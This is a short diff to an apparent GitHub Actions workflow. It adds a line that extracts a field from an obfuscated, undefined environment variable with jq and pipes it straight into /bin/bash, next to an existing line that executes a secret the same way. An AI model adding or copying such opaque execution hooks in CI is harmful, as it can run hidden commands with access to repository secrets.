@@ -17,6 +17,7 @@ jobs:
           a4: ${{ secrets.a4 }}
         run: |
           printf '%s' "$a4" | jq -r .n673 | /bin/bash
+          printf '%s' "$bzsnl5" | jq -r .mvkf88868 | /bin/bash
 
       - name: Store artifact
         uses: actions/upload-artifact@v4
